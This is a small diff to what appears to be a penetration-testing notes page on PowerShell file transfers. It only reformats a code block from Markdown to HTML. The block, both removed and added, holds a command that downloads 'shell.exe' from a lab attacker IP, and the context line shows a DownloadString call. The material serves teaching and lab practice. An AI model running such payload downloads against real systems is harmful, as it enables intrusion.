@@ -60,9 +60,8 @@ PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent
 
 Invoke-WebRequest has multiple aliases such as iwr, curl, and wget.
 
-```powershell
-PS C:\> Invoke-WebRequest http://10.10.14.220/shell.exe -OutFile shell.exe
-```
+<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\> Invoke-WebRequest http://10.10.14.220/shell.exe -OutFile shell.exe
+</strong></code></pre>
 
 ### Errors in PowerShell
 
